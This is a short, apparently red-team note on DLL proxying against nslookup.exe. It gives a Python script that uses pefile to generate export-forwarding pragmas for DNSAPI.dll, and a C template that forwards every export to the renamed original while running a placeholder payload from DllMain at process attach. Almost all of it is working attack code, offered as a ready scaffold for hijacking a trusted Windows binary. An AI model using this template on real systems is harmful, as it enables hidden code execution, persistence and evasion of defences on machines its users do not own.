Basic python script to extract all exported functions of a targeted DLL, here `DNSAPI.dll` used by `nslookup.exe`.

```python
import pefile

exported_functions = []
pe = pefile.PE('C:\\windows\\system32\\DNSAPI.dll')
for entry in pe.DIRECTORY_ENTRY_EXPORT.symbols:
    func = entry.name.decode('utf-8')
    exported_functions.append(f'#pragma comment(linker,"/export:{func}=proxy.{func},@{entry.ordinal}")')

exported_functions = '\n'.join(exported_functions)
print(exported_functions)
```

DLL Proxying code via `DNSAPI.dll` on `nslookup.exe`, in this exemple, the original `DNSAPI.dll` file must be renamed `proxy.dll` and the generated dll must be named `DNSAPI.dll`.

```c
#pragma once
#pragma comment(linker,"/export:AdaptiveTimeout_ClearInterfaceSpecificConfiguration=proxy.AdaptiveTimeout_ClearInterfaceSpecificConfiguration,@1")
#pragma comment(linker,"/export:AdaptiveTimeout_ResetAdaptiveTimeout=proxy.AdaptiveTimeout_ResetAdaptiveTimeout,@2")
#pragma comment(linker,"/export:AddRefQueryBlobEx=proxy.AddRefQueryBlobEx,@3")
#pragma comment(linker,"/export:BreakRecordsIntoBlob=proxy.BreakRecordsIntoBlob,@4")
#pragma comment(linker,"/export:Coalesce_UpdateNetVersion=proxy.Coalesce_UpdateNetVersion,@5")
#pragma comment(linker,"/export:CombineRecordsInBlob=proxy.CombineRecordsInBlob,@6")
#pragma comment(linker,"/export:DeRefQueryBlobEx=proxy.DeRefQueryBlobEx,@7")
...

int Main()
{
    // Your payload code.
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)
{
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        Main();
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```
